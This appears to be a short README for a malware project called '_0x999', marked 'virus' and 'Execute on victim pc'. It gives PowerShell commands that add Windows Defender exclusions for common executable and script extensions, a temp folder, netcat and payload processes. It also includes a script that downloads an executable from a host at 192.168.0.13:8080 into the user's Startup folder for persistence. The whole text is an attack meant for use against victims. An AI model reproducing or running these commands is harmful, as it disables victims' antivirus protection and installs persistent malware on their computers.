# _0x999
virus
Execute on victim pc
powershell -Command Add-MpPreference -ExclusionExtension ".exe"
powershell -Command Add-MpPreference -ExclusionExtension ".ps1"
powershell -Command Add-MpPreference -ExclusionExtension ".py"
$download_url = "http://192.168.0.13:8080/_0x999.exe"
$local_path = "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\_0x999.exe"
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile($download_url, $local_path)
exit

scripts

powershell -Command Add-MpPreference -ExclusionPath "C:\tmp"
powershell -Command Add-MpPreference -ExclusionProcess "nc.exe"
powershell -Command Add-MpPreference -ExclusionProcess "_0x999.exe"
powershell -Command Add-MpPreference -ExclusionProcess "payload.exe"
powershell -Command Add-MpPreference -ExclusionExtension ".java"
